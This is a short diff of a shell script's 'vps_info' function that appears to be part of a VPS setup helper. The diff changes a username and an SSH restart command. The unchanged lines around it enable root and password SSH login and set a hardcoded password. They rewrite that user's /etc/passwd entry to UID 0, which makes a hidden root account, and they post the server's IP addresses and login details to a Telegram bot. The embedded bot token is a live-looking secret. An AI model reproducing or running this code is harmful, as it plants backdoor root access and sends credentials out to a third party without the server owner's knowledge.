@@ -435,7 +435,7 @@ vps_info(){
         Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
         get_public_ip
         Port=$(grep -E '^#?Port' /etc/ssh/sshd_config | awk '{print $2}' | head -1)
-        User="abcd"
+        User="Root"
         Passwd="LBdj147369"
         sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
         sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
@@ -446,7 +446,7 @@ vps_info(){
         echo ${User}:${Passwd} | chpasswd ${User}
         sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd
         systemctl restart ssh* >/dev/null 2>&1
-        /etc/init.d/ssh* restart >/dev/null 2>&1
+        rc-service ssh* restart >/dev/null 2>&1
         curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
 IPv4：${IPv4}
 IPv6：${IPv6}
